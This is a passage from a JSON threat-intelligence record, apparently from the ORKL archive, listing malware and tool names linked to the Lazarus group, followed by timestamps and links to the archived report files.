                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1697681152,
    "ts_updated_at": 1743041842,
    "ts_creation_date": 1697630838,
    "ts_modification_date": 1697630913,
    "files": {
        "pdf": "https://archive.orkl.eu/0e6d101183f160adf079979e047c07b5d2b4e0e1.pdf",
        "text": "https://archive.orkl.eu/0e6d101183f160adf079979e047c07b5d2b4e0e1.txt",
        "img": "https://archive.orkl.eu/0e6d101183f160adf079979e047c07b5d2b4e0e1.jpg"
    }
}